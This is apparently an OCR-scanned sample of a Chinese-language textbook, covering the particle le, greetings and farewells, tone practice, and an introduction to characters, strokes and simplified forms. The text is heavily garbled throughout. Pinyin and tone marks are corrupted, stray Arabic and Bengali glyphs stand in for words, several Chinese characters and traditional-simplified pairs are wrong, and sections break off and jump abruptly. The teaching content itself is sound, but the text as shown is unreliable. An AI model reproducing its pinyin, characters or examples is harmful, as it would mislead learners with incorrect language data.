Hdi (shi)\nis frequently accompanied by the sentence-final particle ne, which generally\nconveys a tone of immediacy or suspense (as well as being associated with\nfollow-up questions, cf. §1.6.2).\n\nHai méi chifan ne. ‘[We] haven’t eaten yet.’\nHai méiyou 20200 ne. “[ haven’t bathed yet.’\nHai méi shangban. “[She] hasn’t started work yet.’\n\n1.7.2 Vac with le\n\nVict may also appear with 6. As noted in {1.5.2, le with SVs signals a change of\nstate, or a newly relevant state: jintian hdo le. With V.a, the function of le is\nmore diffuse, or at least it seems so from a learner’s perspective. Le with Vac,\nmuch as it does with SVs, may signal a newly relevant situation or phase. But\nwith ‏ے۷‎ the initiation or conclusion of the action may be of relevance.\n\nInitiation:\nZou le. “[They]re off.’\nChifan le. ‘(They]’ve started [eating].’\nShangkeé le. ‘Class is starting.’\nConclusion:\nZou le. ‘(They]’ve gone; [they] left.’\nChifan le. ‘[We]’ve eaten; [we] ate.’\nShangkeé le. ‘(They]’ve gone to class; [they] went to class.’\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n54 THE CORE UNITS\n\n‘Conclusion’ may seem like another way of saying ‘past tense’, but there are\nreasons for avoiding any identification of le with [past] tense. You have already\nseen that, with SVs, the past situation is not that which is marked with le, but\nthe current one: Zudtian ‏اط‎ shiifu, jintian hao le. You will also see many other\ncases where past tense in English does not correspond to the presence of le in\nChinese. More to the point: injecting the notion of past tense into our descrip-\ntion of le suggests a static function quite at odds with that other, well-\nestablished dynamic function of le, to signal a particular relevance of an event\nto the current discourse—the story line that is being advanced.\n\nFor the time being, then, note that le has two faces: it signals the current\nrelevancy of a new state or situation (in this case, le can appear with the nega-\n\ntive bi).\nLéng le. “[It「s gotten cold.’\nBu léng le. “[It「s not cold anymore.’\nBu chi le. ‘(They]’re not eating anymore.’\n\nThe particle le can also signal the current relevance of a completed event (in\nwhich case it is negated by méi (you)).\n\nShangké le. ‘Class is beginning; [they]’ve gone\nto class.’\nHai méityou) shangké ne. ‘(They] haven’t gone to class yet.’\n\nConfusion about the several senses of le with ‏م۷‎ can often be resolved by\nthe addition of an adverb, such as yijing ‘already’.\n\nTamen yijing zou le. ‘They’ve already left.’\nW6 yijing chifan le. ‘T’ve already eaten.’\n‏ج770‎ xidban le. “[He]「s already quit [for the day].’\n\n1.7.3, Questions\nActions can be questioned with the question particle ma.\n\nChifan le ma? ‘Have [you] eaten [a meal]?’\nXizdo le ma? ‘Have [you] bathed?’\nShangban le ma? ‘Has [she] started work?’\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 55\n\nActions can also be questioned with the V-not-V pattern, with the negative\noption reduced to méiyéu (or just méi).\nChifan le méi(you)?\n20200 le méi{you)?\nShangban le méi{you)?\n\n1.7.4 Summary of le patterns\n\n1.7.5 Mini-conversations\n\nSections 1.1-1.7 present a considerable amount of information. The best way\nto internalize it is to practice short dialogues built around questions. Here are\nsome examples. (The near synonyms késhi and danshi, used in the following\ntwo conversations, are both comparable to English ‘but’.)\n\nDIALOGUE A\nJia: Xizdo le ma? ‘Have [you] bathed?”\nYi: 76 ‏,ءا‎ késhi hai méi chifan.

There are a number of variants on the basic Chifan le\nma that may serve this purpose. A particularly common variation used with\nverbs that describe regularly occurring events (such as having meals and going\nto work) involves the addition of a post-verbal gu6 (usually untoned), whose\nroot meaning is ‘to pass by, over, through’. Guo can occur in both the question\nand in responses (positive and negative), but it can also be dropped from the\nresponses, as demonstrated below.\n\nChiguo (fan) le ma? { Chi(guo) ‏ءا‎\n\nHai méi (chi(guo)) ne.\n1.8.2 Reductions\n\nIn context, utterances are likely to be reduced along the following lines: méiyéu\n一 méi; chifan > chi (however, xizdo does not reduce to xi, since xialone means\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 57\n\n‘to wash’ rather than ‘to bathe’). Thus, the following are all possible—though\nthe more elliptical questions are likely to produce more elliptical answers. (The\nEnglish glosses for the responses only suggest the differences.

Below are five common\nChinese surnames, followed by a title which means, literally, ‘teacher’, and the\nSV hao, which in this context serves as a simple acknowledgment. Ldoshi, which\nhas no exact correspondence in English, can be applied to both males and\nfemales, as well as to all ranks of teachers.\n\nZhang ldoshi hao. ‘Hello, Professor Zhang.’\nWang ldoshi hao.\n\nLi laoshi hao. [with tone shift]\n\nZhao ldoshi hao.\n\nChén ldoshi hao.\n\n1.9.2 Hello\n\nUsing specialized greetings such as ‘hi’ or bonjour to acknowledge or confirm\nthe value of a relationship on every encounter is not a universal feature of cul-\ntures. The practice seems to have crept into Chinese relatively recently. Whereas\nin the past, people might have acknowledged your presence by asking where\nyou were going or if you had eaten (that is, if they said anything at all to a\nstranger), urban Chinese today often make use of phrases like ni hdo in ways\nsimilar to English ‘hi’ or ‘hello’. Most people would probably regard ni ۸۸۰ as\nthe prototypical neutral greeting, but other options are listed below.\n\nNi hao! ‘Hi! Hello!’\n\nNin hao! [deferential] ‘How do you do?’\n\nHei! [exclamation] ‘Hey! Hil’\n\nHao! ‘Hi! Hello!’\n\nHao ma? ‘You well?’\n\nNi hao a! [informal] ‘How’re you doing?”\n\nDajia hao. [to a group] ‘Hello, everyone.’ (‘big-family well’)\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n60 THE CORE UNITS\n\nA version of ‘good morning’, based on the verb zdo (‘be+early’), has been in\ncommon usage in Taiwan for some time and is now becoming more common\non the Mainland as well.\n\nZao! ‘Morning!’ (‘betearly’)\n\nZdo an. ‘Good morning.’ (‘early peace’)\nNi 0.\n\nNin 20.\n\nExpressions comparable to English ‘good afternoon’ or ‘good evening’ are\nalso starting to be used in modern China. Thus, xidwii ‘afternoon’ and wanshang\n‘evening’ are used in the expressions 2010৮ hdo ‘good afternoon’ and wdanshang\nhao ‘good evening’. Wan an ‘good night’ (‘late peace’), used as a sign-off at the\nend of the day, has a longer pedigree and is now commonly used by staff in\nlarger hotels, for example.\n\nIn general, greetings of the sort listed above are used more sparingly than\ntheir English counterparts. Colleagues or classmates passing each other, for\nexample, are less likely to use a formulaic greeting such as ni hdo, though rela-\ntive cultural novelties such as fast food restaurants and toll booths may encour-\nage broader use. In general, though, a greeting to someone of higher status\nshould be preceded by a name, or a name and title (as in §1.9.1).\n\n1.9.3 Good-bye\n\nMany cultures have conventional phrases for taking leave. Often, blessings\nserve this purpose (e.g., ‘bye’, from ‘good-bye’, supposedly derived from the\nphrase ‘God be with you’). Below are several Chinese variations of ‘good-bye’,\nbeginning with the standard, zdijian (‘again-see’).\n\nZaijian. [neutral] ‘Good-bye.’ (‘again-see’)\n\nYihuir ~ ythuir jian. [friendly] ‘See [you] soon.’ (‘awhile see’)\n\nMingtidn jian. [neutral] ‘See [you] tomorrow.’ (‘tomorrow\nsee’)\n\n7۷0101. [informal] ‘See [you] later; bye.’ (‘return-see’)\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 61\nHuitou jian. [friendly] ‘See [you] shortly.’ (‘return-head\nsee’)\nMan zou. [friendly] ‘Take it easy.’ (‘slowly walk’)\nNOTES\n\na. The addition of final r to a written pinyin syllable represents a complex series of phonetic\neffects that will be considered more fully later. In the case of yihuir ~ y 仪 i the final 7 affects\nthe quality of the preceding vowel, so that it is pronounced ‘yihuér ~ yihuér rather than ‘yihuir\n~ ythuir’. The usual prescription applies: listen to your teacher or to the audio.\n\nb. The alternate pronunciation yihuir may be more common in dialects found in southern\nChina.\n\nc. Students and other urban youth of all kinds often end a series of farewells with the English-\ninfluenced expression baibai.\n\nd. As with greetings, when saying good-bye to an older person or a person of rank, it is normal\nto mention name and title first, e.g., Wéi Idoshi, zdijian.\n\n1.9.4 Bon voyage\n\nThis is a good time to familiarize yourself with a few phrases that are used to\nwish people well when they leave on a journey, or to greet them when they\narrive. The most common expression for bon voyage is:\n\nYilu-ping’an. (‘Whole-journey peaceful.’)\n\nThis expression applies to almost any journey, whether by air, ship, or bus.\nYilu-shunféeng (‘whole-journey favorable-wind’) has much the same meaning,\nbut it is not used for journeys by air. Chinese people are generally superstitious\nabout the effect of words, and many would usually deem it ill-advised to\nmention the word féng ‘wind’ before a flight. Notice that both expressions\ncontain four syllables, a favored configuration in the Chinese lexicon.\n\nIn greeting someone returning from a long journey, instead of the question\n‘How was the flight/journey/voyage>’, Chinese people generally utter a variant\nof an expression that reflects the traditional discomforts of travel.\n\n(Lu shang) xink ba? 1০060 journey, huh?’ (‘(road on) bitter BA’)\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n62 THE CORE UNITS\n\nAn analysis of these expressions is provided above, but at this stage, they\nshould simply be memorized (by repetition) and kept in storage for greeting\nvisitors or seeing people off.\n\nYilu-ping’an!\n\n1.9.5 Smoothing the transitions\n\nA. PRIOR TO ASKING A QUESTION In more formal situations, questions are often\nprefaced with the expression gingwén (‘request-ask’), idiomatically equivalent to\n‘may I ask’ or ‘excuse me’. Qingwén may also be preceded by a name and title.\n\nQingwén, ni chifan le ma? ‘Excuse me, have you eaten?’\nZhao ldoshi, qingwén, nin 8 bu ۶ ‘Professor Zhao, mind if I ask:\nare you hungry?’\n\nQing ‘request; invite’ also occurs in the common phrase qing 2۷۸ ‘have a seat’\n(‘invite sit’) and the expression ging jin ‘won’t you come in’ (‘invite enter’).\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 63\n\nB. PRIORTO LEAVING In the normal course of events, a simple good-bye is often\ntoo abrupt for closing a conversation. One way to smooth the transition is to\nannounce that you have to leave before you say good-bye. Here are four ways\nto accomplish this, all involving the verb zéu ‘to leave; to go’. These expressions\nare complicated to analyze; some notes are provided below, but otherwise, they\nshould be internalized as units.\n\nHao, na w6 zou le. ‘Okay, I’m off then.’ (‘okay, in+thattcase, I\n\nleave LE’)\nHei, 6 gai zou le. ‘Say, I should be off.’ (‘hey, I should leave LE’)\nHao, na jit zhé ‘Okay then, that’s it, [I]’m off ‘okay, in+that+\nyang ba, zou le. case, then this-way BA, leave LE’)\nBu 250 le, ৮৮6 gai “[It「s late, I’d better be off’ (‘not betearly LE,\nzou le. I should leave LE’)\n\nNOTES\na. gai / yinggai ‘should; must’; n ‘in that case; well; then’; ji ‘then’; ba (particle associated\nwith suggestions); le ([here] signals a new situation)\n\nb. Taking leave obviously involves a broad range of situations, including seeing someone off\non a journey (which, in China, is an extremely important event). The four options included in\nthis section are acceptable for closing an informal conversation.\n\n1.10 Tones\n\n1.10.1 Tone combos (the first six)\n\nTones are easier to perceive and assimilate in pairs. Four tones form sixteen\npossible combinations of two, but because of the previously discussed restric-\ntion on combinations of low tones (3 + 3 = 2 + 3), only fifteen pairs are distinc-\ntive. The six sets below are mostly comprised of words you have already\nencountered. They should be memorized so that they can be recited by number\n(typically as part of warm-up activities at the beginning of class): di-yi: Idoshi,\n\nJjinzhang; 11-24 xizdo, hén hao, etc.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n64 THE CORE UNITS\n(0 Idoshi (2)  xizdo (3) ‏۵۳07ء‎\n‎Jjinzhang hén hao kanbao\n(4) ط٤‎ (5) 167 mang (6) bu gao\n‏اط‎ 61 hén nan shangban\nNOTE\n\nhén nén ‘difficult’\n\nTones in combination tend to accommodate each other to some degree,\nthough not to the point of shifting to another tone. In the above sets, the most\nsalient adjustment is probably that of 4 + 4 (zaijidn), where the tone of the first\nsyllable is not as steeply falling as that of the last. The first of the two is some-\ntimes referred to as the ‘modified fourth tone’.\n\n1.10.2 Tone lock\n\nIn these first weeks of learning Chinese, you may find yourself unable to pro-\nnounce a tone, even unable to mimic your teacher—a situation that might be\ncalled ‘tone lock’. Tone lock can occur for many reasons, but a common one\nfor beginners is that you will often be tentative, and tentativeness in English is\naccompanied by a rising contour. This is fine if you are trying to say a name,\nsuch as Wang, with rising tone. However, it won’t work if you want to say Wéi,\nwith a falling tone. Other frustrating conditions may occur: you may hear rising\nas falling, and falling as rising (flip-flop); your falling tone may refuse to fall\n(‘fear of falling’), your level tone may refuse not to fall (‘fear of flying’). Regard-\nless of the symptoms, the best cure is to take a figurative step back and make\nuse of your tone concepts: level is ‘sung out’, rising is ‘doubtful’, low is ‘low’\n(despite the contoured symbol), and falling is ‘final’ or ‘confident’.\n\n1.10.3 The first ‘rule of three’\n\nIf you find that the tonal cues, ‘sung out’, ‘doubt’, ‘low’, and ‘final’ do not serve\nyou well, there are others that have been used in the past. Walter C. Hillier, in\nhis 1953 English-Chinese Dictionary (London: Routledge and Kegan Paul Ltd.),\nproposed ‘languid assertion’ for the first tone, ‘startled surprise’ for the second,\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 65\n\n‘affectionate remonstrance’ for the third, and ‘abuse’ for the fourth. Whatever\nthe label, the important point is to follow the rule of three: develop a concept\nfor each tone, know what tone each word has, and monitor yourself when you\nspeak.\n\n1. Conceptualize the tones (‘sung out’, etc.).\n\n2. Learn tones with each word (e.g., ٥۸م‎ has a low tone).\n3. Monitor your speech.\n\nExercise 3\n\nRead out the following sets (recall your tone concepts).\n\n1. dé da da da 5. bu bu bi bu\n2. 6৮ kou 16৮  kou 6. jin jin jin jin\n3. pan pan pan pdn 7. gud gud gud 8৮০\n4. wei wei wei wei 8. hai hai hai hai\n\nTone shifts: Read the following sequences aloud, and write the missing\ntones that indicate tone shifts.\n\n1. bu mang bueé 7. yi 0 yi tido\n2. bu léi bu shi 8. yikuai  di-yi\n\n3. bujinzhang bu ké 9. yiwéi yi zhang\n4. bu hao bu cud 7০. pibén  yike\n\n5. hen 0 hen mang 11. hen zdo hen wan\n6. hen léi hen nan 12. haihdo hen ké\nNOTE\n\nhén win ‘late’\n\nLearners often feel the tones that are the most difficult to distinguish are\nthe rising and the low.

Outside class, however, people\nstill learn parts for plays and often recall song lyrics, advertising jingles, and\nslogans without much self-conscious effort. We will take advantage of these\npredilections by providing some suitable Chinese rhymed and rhythmic mate-\nrial at the end of each of the core units. This material ranges from doggerel to\npoetry, from jingles to nursery rhymes, and from satirical verse to songs and\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n68 THE CORE UNITS\n\npoems. It has been selected for ease of recall, and eventually it will form a\nuseful repertoire that can be tapped for information about pronunciation,\nvocabulary, and grammatical patterns. It also provides something to recite\nwhen you are asked to ‘say something in Chinese’ or when you are in China\nand are asked to sing or perform for an audience. Closer to home, you may be\nasked to atone for being late to class by reciting some short piece in front of\nyour classmates.\n\nThe first rhyme—a nursery rhyme—tells the story of a young entrepreneur\nand his struggle to set up a business.

This lesson presupposes\nfamiliarity with the material in at least Unit 1.\n\n8.1 General features of Chinese texts\n\n8.1.1 Size\n\nRegardless of complexity, characters are uniform in overall size, fitting into an\nimaginary rectangle along the lines indicated in the following example (written\nwith simplified characters). For this reason, characters are also called fangkudizi\n‘squared writing’.\n\n弋 海 | 书 臣 | 硒 [PAY 。 Shanghai tiangi hén re.\n\n8.1.2 Spacing\nCompare the character and pinyin versions of the sentence above: though the\nconvention is not always consistently followed, pinyin places spaces between\n\n399\n\nCopyright © 2011 Yale University\n\nLearning Chinese Sample\n\n400 THE CHARACTER UNITS\n\nwords rather than syllables. Characters, however, are evenly spaced, regardless\nof word boundaries.\n\n8.1.3 Punctuation\nModern Chinese writing makes use of punctuation conventions that are similar\nin form to those of English, though not always identical in function.\n\nPeriods, full stops: of.\n\nThe former is traditionally used, but the latter\nis becoming more common.\n\nCommas: , 丿 、\n\nThe latter is commonly used in lists separating\nenumerated items.\n\nQuotes: ۶0000 0\n\nThe first type is traditionally used, but the\nothers are also common.\n\nProper names: There is nothing comparable to a capital letter\nin Chinese. Proper names are usually\nunmarked, though, occasionally, they are\nindicated by a wavy underline.\n\nOther punctuation will be noted as it is encountered.\n\n8.1.4 Direction\n\nTraditionally, Chinese has been written and read from top to bottom and from\nright to left. Major writing reforms instituted in the PRC during the 1950s not\nonly formalized a set of simplified characters, but required them to be written\nhorizontally, from left to right, like modern European languages. As a result,\nChinese texts now come in two basic formats. Material originating in Taiwan\nand traditional overseas communities, or on the Mainland prior to the reforms,\nis written with traditional characters that are, with a few exceptions such as in\nheadlines and on forms, arranged in vertical columns and read from right to\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 8 401\n\nleft. Material originating in the Mainland, in Singapore, and in some overseas\ncommunities subsequent to the reforms of the 1950s is written with simplified\ncharacters arranged in horizontal rows and read from left to right, just like\nEnglish and countless other languages.\n\nA number of other writing systems originally adopted the Chinese conven-\ntion of vertical writing, though most of these have also since shifted to a pri-\nmarily horizontal configuration. Japanese writing remains vertical for the most\npart. Korean shifted to mostly horizontal a few decades ago. The Classical\nMongolian script, still seen on some of the buildings in the National Palace\nMuseum in Beijing and elsewhere, was written vertically on the Chinese\nmodel, but with columns moving left to right, not right to left. Nowadays,\nMongolian is mostly written in the Cyrillic (Russian) script, horizontally and\nleft to right.\n\n8.2 The form of characters\n\nCharacters are the primary unit for writing Chinese. Just as English letters\nhave several forms (such as g/g and a/a) and styles (such as italic and bold),\nChinese characters also have various realizations. Some styles that developed\nin early historical periods survive to this day in special functions. For example,\nhe Chinese traditionally use ink impressions made by seals or ‘chops’,\nmostly square-shaped and made from various types of stone, in lieu of signa-\ntures on documents and items of value. The names and other characters on\nsuch seals are usually, even now, inscribed in a version of the character scrip\n\nknown as the ‘seal script’ (zhudnsha), first developed during the Qin dynasty\n(3rd century BCE). Other scripts include the ‘grass script’ (ctoshH) and the\n‘running script’ (xingshii), impressionistic versions of the standard script tha\nare still used in handwriting and art. As in other scripts, advertisers and\ndesigners may also modify the look of characters in a variety of differen\nways for their own purposes. Putting such variants aside, it is estimated tha\nthe number of distinct characters appearing in modern texts is between 6,000\n\nand 7,000. Fortunately, about half that number will suffice to read mos\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n4o2 THE CHARACTER UNITS\nmodern material, such as newspapers, academic writing, and popular novels.\nHigh total numbers of characters are to be found in the most comprehensive\ndictionaries, but these numbers are inflated by archaic characters and\nvariants.\n\n8.2.1 Radicals and phonetics\nThere are certain ameliorating factors that make the Chinese writing system\nmore learnable than it might otherwise seem to be. One of the most significant\nis the fact that many characters have common constituents. Between two-thirds\nand three-quarters of common characters (cf. DeFrancis 1984, p. 110 and\npassim) consist of two elements, both of which can often also stand alone as\ncharacters in their own right. Historically, these elements were selected either\nfor their sounds (hence the term ‘phonetic elements’, or simply ‘phonetics’),\nor for their meanings (making them semantic elements, commonly called\n‘radicals’). Thus, & wang ‘to forget’ contains 亡 wdng as a phonetic element\nand ‏ےہ‎ ‘heart’ as a radical; 语 yu ‘language’ is composed of 吾 wi and 言\n‘language’. The significance of phonetics and radicals will be discussed\nin a later section. For now, it is enough to know that a few hundred simple\ngraphs are the building blocks for a large number of compound graphs: for\nexample, 亡 appears in 忙 and 氓 ; sin 志 and 忠 ; 言 in # and 说 ; 吾 in 悟\n\nand 晤 . These ‘root’ graphs number in the high hundreds, and familiarity\n\nwith them allows many characters to be learned as a pairing of higher-order\n\nconstituents (such as 中 + 心 ) rather than just a complex composite of\n\nstrokes ( 忠 )\n\n8.2.2 Simplified characters\nAs noted in the introduction, Chinese policy makers tried to make the writing\nsystem easier to learn by introducing the Chinese equivalent of spelling reform,\nie, reducing the number of strokes in complicated characters. Thus, 3]\nbecomes 国 and i# becomes 边 , with the simplified version generally modeled\non variants that had long been current in handwriting or calligraphy, but\nnot in print. The two sets of characters are usually referred to in English as\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 8 403\n\n‘traditional’ and ‘simplified’, and in Chinese as fantizi (‘complicated-body-\ncharacters’) and jidntizi (‘simple-body-characters’).\n\nFor you, the learner, this simplification is a mixed blessing; while it ostensi-\nbly made writing characters simpler, it also made characters less redundant for\nreading. For example, 乐 and ® (‘music’ and ‘east’, respectively) are quite\n乐 and 札 一 are\n\ndistinct as traditional characters, but their simplified versions\neasier to confuse.\n\nAs noted in the Introduction, jidntizi and féntizi should not be thought of as\ntwo distinct writing systems; many characters retain only one form ( 也 yé, 很\nhén, 好 hao), and of those that have two forms, the vast majority exhibit only\nminor differences: iit, / 说 , 饭 / #%. There are perhaps only three dozen relatively\n\nww\n\ncommon characters with quite divergent forms, such as ix / 这 and 买 / 贺 .\nCareful inspection reveals that even these characters often have elements in\ncommon. For native Chinese readers, the two systems represent only a minor\ninconvenience, on par with the discrepancies between capital and lowercase\nletters in the Roman alphabet (though, admittedly, on a larger scale). Generally,\nlearners focus on one system for writing, but soon get used to reading in both.\nIn this text, both sets are introduced, but most of the readings are based on the\nsimplified set that is standard for the 1.3 billion people on the Mainland. In\nmost major sections of the character lessons, there is at least one sample text\nor exercise written in traditional characters.\n\n8.3 The function of characters\n\nAs noted in the Introduction, Chinese uses a system of writing that employs\ncomplex symbols (characters) to represent syllables of particular words, or syl-\nlables that constitute parts of particular words. For this reason, it is difficult to\nuse Chinese characters to transcribe foreign names: ‘Italy’ can be incorporated\ninto Chinese as Yidali and written 意 大 利 , but the usual meaning of the char-\nacters, ‘meaning-be big-benefit’ can only be dimmed by context, not completely\nsuppressed.\n\nIn Chinese, different words with identical sounds (homophones) will usually\nbe written with different characters.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n404 THE CHARACTER UNITS\nsound 4 jin ٦\nmeaning ‘today’ ‘metal’\ncharacter 今 全\n\nSuch homophony is common in Chinese at the syllable level (as illustrated\nin the shi story, described in the Introduction). Here, for example, are common\nwords or word parts that are all pronounced shi:\n\nshi\n是 to be’ = ‘thing’ দু ‘room’ ‏ڑ‎ ‘test’\n\nExcept for certain high-frequency words (such as 是 shi to be’), words in\nMandarin are usually compound, consisting of several syllables: 事 情 shiqing\n‘things’; #'£ jidoshi ‘classroom’; 考 试 805 ‘examination’. At the level\nof words or compound words, homophony is relatively rare. In Chinese\nlanguage word processing with pinyin input, typing ‘shiqing’ and ‘kaoshi’ (most\ninput systems do not require tones) will elicit only a few options; and since most\nword-processing software organizes options by frequency, this usually means\nthat the correct characters for shiging and kédoshi will often be produced on\n\nthe first try.\nshi\nshiging jidoshi 18051\n‘thing’ ‘classroom’ ‘test’\n8.4 Writing\n\nAs noted in the Introduction, one of the most important pedagogical functions\nof learning to write Chinese characters is that it draws your attention to detail.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 8 405\n\nCharacters are often distinguished by no more than a single stroke, or just a\nchange in the orientation of a single stroke.\n\n4 strokes: “ 天 天 夫 犬 太\ntian yao fi quan tai\n‘sky’ ‘goblin’ ‘person’ ‘dog’ ‘grand’\n5 strokes: 白 申 田 7٢۳ 由\nbai shen tidn ] you\n‘white’ ‘to explain’ ‘field’ ‘A’ ‘from’\n\nFor the learner, there are also aesthetic and practical reasons for being able\nto write characters, over and above the contribution that writing makes to\nreading. Reasonable goals at the beginning level are to learn the principles of\nwriting so that any character can be reproduced by copying, and to learn to\nwrite from memory a selection of representative graphs that can serve as the\nbasis for future calligraphic endeavors.\n\n8.4.1 Principles of drawing characters\n\nThere are many good websites that deal with the writing of Chinese characters.\nSome not only present the general principles of writing, but also allow the\nviewer to select characters and watch them drawn in animation, stroke by\nstroke. In this section, we will try to sketch out the basic principles of writing\nChinese characters without using special graphics or non-text insertions and\nleave readers to browse the specialized websites for additional helpful informa-\ntion. (Cf. for example, yellowbridge.com, and the useful links listed in the\nappropriate sections of the Chinese Language Teachers Association website:\nclta-us.org.)\n\nCalligraphic strokes are called bihua(r) in Chinese. Strokes are drawn with a\nmore or less fixed order and direction that are ultimately derived from calli-\ngraphic practices. This stroke order (bishwn) is considered important for both\naesthetic and pedagogical reasons. Characters tend to look awkward if not\ndrawn with the conventional order of strokes; and following the prescribed\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n406 THE CHARACTER UNITS\n\nstroke order develops a tactile memory for characters that can act in support of\nvisual memory.\n\nA. FORM Characters are usually said to be formed from eight basic strokes,\nbut because two of the ‘basic’ strokes’ only appear appended to others (without\nthe writing implement being lifted from the surface), they should really be\nregarded as basic components of strokes rather than actual strokes. All eight\nare illustrated below, with the names of each given on the far left. It is useful\nto be able to describe how a character is written by naming its strokes: héng +\nshw ‘horizontal + vertical’ for 十 , pié + nd ‘slanting down to the left + slanting\ndown to the right’ for A. Chinese children often do this when they are learning\nto write, and we will do the same below when the general principles of stroke\norder are discussed.\n\nTo keep the presentation as clear as possible, the principles of drawing are\nillustrated by relatively simple characters. In most cases, it should be easy to\nidentify the stroke in question.\n\nThe unitary strokes\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 8 407\n\nExtensions with gou ‘hook’ and zhé ‘bend’\n\nNAME AND MEANING DESCRIPTION EXAMPLES IN CHARACTERS\nhénggou ‘horiz. + a horizontal stroke 次 买\nhook ending in a down-\nwards hook\nshiigou ‘vert. + hook’ a vertical stroke ending 小 水\nin a leftwards hook\nxiégou ‘slanted + a stroke that slants 氏 戈\nhook downwards to the\n\nright and ends in a\nupwards hook\nhéngzhé ‘horiz. + a stroke that begins 夫 书\nbend’ horizontal then bends\nto near vertical\nshuzhé ‘vert.+ bend’ 310 一 shaped stroke\n\n围\n区\n\nNOTES\n\na. The stroke xiégou ‘slant + hook’ is always so called even though nagou ‘slanting down to the\nright + hook’ also looks like a reasonable name for it.\n\nb. Sometimes a subcategory of the pié stroke, dudnpié ‘short + slanting down to the left’, is\nincluded in the list of basic strokes. Examples would be the top stroke of 千 or the top-left\nstroke of 午 . Otherwise, these strokes are simply pié.\n\nc. There are in fact some miscellaneous strokes that cannot be usefully analyzed in terms of\nthe eight basics, e.g. wangou ‘curved + hook’, that appears, for example, on the left-hand side\nof the character 牲 .\n\nd. It is also quite common to combine three stroke components into a single stroke. The\nbottom stroke of 书 (shown above) consists of ‘héngzhé + gow’, i.e. ‘horizontal with bend +\nhook’. In fact, in terms of frequency, bent strokes are more common with a final hook than\nwithout; cf. JL, 也 , 刁 .\n\n৪.

Before characters can be read, however, they\nneed to be recognized; and to be recognized, key features need to be noticed.\nIn these lessons, characters are introduced in a large size, with information\nabout number of strokes, pronunciation, general meaning, and form. This\ninformation is intended to give the characters some individuality and provide\ntraction for the reading process. Sometimes, knowledge about the actual history\nof the character may account for, and therefore help to remember, its form. In\nother cases, the actual history of the character may be less helpful than a fanci-\nful account. The notes that follow the introduction of each set of characters\ncontain both actual and fanciful etymologies. Students, in any case, often make\nup their own stories to account for the form of characters. What is important\nis to find a way to link the shape of the character to the word it represents so\nthat reading can proceed.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n410 THE CHARACTER UNITS\n\nIn the later sections of this lesson, and in other lessons, readings begin with\nwords and phrases (with pinyin confirmation), then continue with short inter-\nactions, longer dialogues, and, when possible, narratives and stories. Once you\nfind that you can read the material with confidence, you can consolidate by\nlearning to write the graphs. Focusing on individual graphs will draw your\nattention to slight differences and prepare you for encountering new\ncombinations.\n\nNOTES\n\na. Since most words in Mandarin are compounds (of two or more syllables), characters gener-\nally represent parts of compounds rather than words as such. Sometimes combinational or\nhistorical information can suggest a general meaning for a single character in a compound:\n明 天 “bright「 + ‘day’ for mingtian ‘tomorrow’. In cases where a particular character has no\nindependent existence outside a compound, it may not be possible to give it a reliable meaning:\n॥ K zuctian ‘(? + day) yesterday’. (The same problems exists for the English word ‘yesterday’,\nwhich combines the word ‘day’ with the non-word ‘yester’.) In such cases, if a general meaning\ncan be inferred from other combinations, it will be placed in parentheses.\n\nb. For characters with two forms, simplified and traditional, both forms are given, with the\ntraditional form above the simplified. The reason for this order is that the simplified generally\nderives from the traditional. Once past the initial introduction, however, the focus is more on\nthe simplified set, and when both are cited, simplified precedes traditional.\n\nc. The order and direction of strokes for individual characters are provided in Appendix 1.\n\nd It is not crucial to know which radical a particular graph is classified under, but it is useful\nto recognize the most common radicals. The system of paired numbers written beneath the\n\nlarge-format characters that provide the introduction to each set is a practical way of doing this.\nThe first number represents the number of strokes for the character’s radical. The second\nnumber represents the number of remaining strokes in the character. (Traditionally, Chinese\ndictionaries are organized in this way, first by radical, then by number of strokes.) The sum\nof these two numbers is the total number of strokes for the character. When the second\nnumber is zero (as for 长 4+ 0 / 长 8 + ০), the character is itself a radical. In some cases,\ncharacters that have only one form have been assigned a different radical in the simplified set\nfrom that of the traditional; for example, # di ‘younger brother’, for which there is no\ntraditional-simplified distinction, is assigned the radical 4 in the traditional set (3 + 4), but X\nin the simplified set (2 + 5). In such cases, both numbers are given, with the traditional radical\nassignment first.\n\nFor the majority of cases, the numbering method makes it clear which element is the radical.\nHowever, when the radical is obscure, or the number of strokes for the radical happens to\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 8 411\n\nequal the number of strokes that remain (as is the case for ‘six’ below 一 a + 2), the numbers\nwill not indicate the radical with certainty. Knowing the radical assigned to a character was\nmore important when dictionaries were organized by radical rather than pronunciation, as they\ntend to be now. Nowadays, it is enough to know the more common radicals, and the numerical\nsystem used herein will suffice to bring those to light.\ne. Traditional characters would normally be written vertically, but for reasons of practicality,\nthey too are presented in horizontal format herein.\n\nf. Occasionally, new characters which have not been formally introduced in the character\n\nlessons are included in texts on the assumption that they can be identified from the context.\nSuch material is underlined. When context is insufficient, new material is glossed in notes that\nfollow.\n\ng. As noted in the Introduction, a sensible policy toward the two character sets is to read both\nbut write simplified.\n\nSUMMARY Scan the large-format characters and the analysis and notes that\nfollow to try to find a connection between each character and the word that it\nrepresents.\n\nRemind yourself of the words and phrases that contain the new characters\nby covering up the pinyin with a pencil and reading the phrases section ({8.12.1).\nThen uncover the pinyin and check.\n\nMaking use of context, do the readings until you have a clear comprehension\nof the passage while reading it aloud.\n\nFinally, complete the exercises, practice writing the characters until familiar,\nand review.\n\n8.6 Numbers\n\n一 一 一 一\n一 = 四\n一 一 一 —\nI+2\nsan\n\nI 十 O 2 十 O 3 十 2 I 十 3\nyi er si 